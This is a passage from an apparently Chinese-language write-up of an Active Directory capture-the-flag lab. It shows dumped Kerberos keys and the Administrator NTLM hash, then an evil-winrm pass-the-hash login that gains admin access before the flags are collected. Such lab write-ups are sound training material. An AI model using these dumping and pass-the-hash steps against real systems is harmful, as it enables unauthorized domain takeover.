spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:ddd8d4188ec749a6a15363148c9e1bd38bc7efcced93c9608bbb268dc8370ddc
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:092bae4c354fd2ae12bc80e0c5419c21
ATTACKTIVEDIREC$:des-cbc-md5:9bc8f44a6b85b0fd
[*] Cleaning up...

```

可以注意的一點是 `Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
`這一坨 hash 的後半部就是 NT HASH `0e0363213e37b94221497260b0bcb4fc`

最後就是用工具 `Evil-Winrm` 去登入，會選用這個工具是因為他支援用 NT Hash 的方式去做登入

```bash=
┌──(kali😺kali)-[~/my_pt_tools/windows_ad]
└─$ evil-winrm -H 0e0363213e37b94221497260b0bcb4fc --ip 10.201.83.237 --user Administrator
```

登進去之後就是管理員ㄌ，開心撈 Flag 時間

user flag:

![image](https://hackmd.io/_uploads/rJAhcBjCxe.png)



priv flag:

![image](https://hackmd.io/_uploads/SJjejSiRel.png)



root flag:

![image](https://hackmd.io/_uploads/rkm7sBiAgg.png)


## Pwned!


![image](https://hackmd.io/_uploads/SJjiYBi0xx.png)


## 後記

我快被二一了，先斷更一段時間，然後 ad 真的好難。。。